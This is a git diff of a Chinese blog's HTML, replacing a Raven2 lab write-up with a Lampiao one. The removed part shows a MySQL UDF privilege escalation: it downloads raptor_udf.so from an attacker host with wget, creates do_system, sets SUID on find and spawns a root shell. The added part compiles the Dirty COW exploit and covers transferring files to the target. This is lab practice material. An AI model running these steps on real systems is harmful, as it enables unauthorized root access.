+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv 40847 40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
 
-<p>在kali下开启Apache服务：<code>/etc/init.d/apache2 start</code></p>
-<p>将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行<code>wget http://192.168.64.131:8080/raptor_udf.so</code></p>
-<p>目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line"></span><br><span class="line">mysql&gt; create table foo(data blob);</span><br><span class="line">create table foo(data blob);</span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));</span><br><span class="line">insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;</span><br><span class="line">select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;</span><br><span class="line">create function do_system returns string soname &apos;raptor_udf.so&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">select * from mysql.func;</span><br><span class="line">+-----------+-----+---------------+----------+</span><br><span class="line">| name      | ret | dl            | type     |</span><br><span class="line">+-----------+-----+---------------+----------+</span><br><span class="line">| do_system |   0 | raptor_udf.so | function |</span><br><span class="line">+-----------+-----+---------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">select do_system(&apos;chmod u+s /usr/bin/find&apos;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(&apos;chmod u+s /usr/bin/find&apos;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| NULL                                 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+<img src="//songxpu.github.io/2019/08/10/Lampiao/dirtycow.png" width="700">
 
-<p><strong>命令执行</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch foo</span><br><span class="line">find foo -exec 'whoami' \;</span><br><span class="line">find foo -exec '/bin/sh' \;</span><br></pre></td></tr></table></figure>
+<p>至此提权成功，获取到flag~</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>记录下渗透过程传输文件的技巧</p>
+<p><strong>Linux系统之间传递文件:scp</strong></p>
+<blockquote>
+<p><em>scp</em>是linux系统下基于ssh登陆进行安全的远程文件拷贝命令，因此需要开启ssh服务</p>
+</blockquote>
+<ol>
+<li><p><strong>从本地传送到远程服务器</strong></p>
+<p><strong>1.1传递文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp local_file remote_username@remote_ip:remote_folder #不改变文件名</span><br><span class="line">scp local_file remote_username@remote_ip:remote_file #改变文件名</span><br></pre></td></tr></table></figure>
 
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
-<li><p><a href="https://www.freebuf.com/column/155911.html" target="_blank" rel="noopener">Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行）</a></p>
+<p>例:<code>scp /root/Desktop/Lampiao/ test.php xm@192.168.64.128:/home/xm/桌面/test.php</code></p>
+<p><strong>1.2传递文件夹</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r local_folder remote_username@remote_ip:remote_folder</span><br></pre></td></tr></table></figure>
+
+<p>例:<code>scp -r /root/Desktop/Lampiao/  xm@192.168.64.128:/home/xm/桌面/</code></p>
 </li>
-<li><p><a href="https://www.jianshu.com/p/54abdd7657e9" target="_blank" rel="noopener">Raven2渗透实战</a></p>
+<li><p><strong>从远程服务器传送到本地</strong></p>
+<p>顺序同上面相反</p>
+<p>例：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp root@www.runoob.com:/home/root/others/music /home/space/music/1.mp3 </span><br><span class="line">scp -r www.runoob.com:/home/root/others/ /home/space/music/</span><br></pre></td></tr></table></figure>
+
 </li>
-<li><p><a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库</a></p>
-</li>
+</ol>
+<p><strong>wget</strong></p>
+<p>在攻击方服务器上开启web服务，将需要的文件放入web目录下，在靶机上相应目录wget下载下来即可。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a href="https://www.runoob.com/linux/linux-comm-tar.html" target="_blank" rel="noopener">Linux tar命令</a></li>
+<li><a href="https://www.runoob.com/linux/linux-comm-scp.html" target="_blank" rel="noopener">Linux scp命令</a></li>
+<li><a href="https://xz.aliyun.com/t/2552" target="_blank" rel="noopener">vulnhub|渗透测试lampiao</a></li>
+<li><a href="https://www.anquanke.com/post/id/84772" target="_blank" rel="noopener">【漏洞预警】CVE-2016-5195 脏牛漏洞：Linux内核通杀提权漏洞（10.27 10:30更新）</a></li>
 </ol>
 
       
@@ -613,14 +697,18 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/08/10/g0rmint/" rel="next" title="g0rmint渗透实战">
+                <i class="fa fa-chevron-left"></i> g0rmint渗透实战
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/10/g0rmint/" rel="prev" title="g0rmint渗透实战">
-                g0rmint渗透实战 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/08/10/LazySysAdmin/" rel="prev" title="LazySysAdmin渗透实战">
+                LazySysAdmin渗透实战 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -770,7 +858,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GETSHELL"><span class="nav-number">2.2.</span> <span class="nav-text">GETSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#udf提权"><span class="nav-number">2.3.</span> <span class="nav-text">udf提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">3.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取会话"><span class="nav-number">2.2.</span> <span class="nav-text">获取会话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GETSHELL"><span class="nav-number">2.3.</span> <span class="nav-text">GETSHELL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">2.4.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
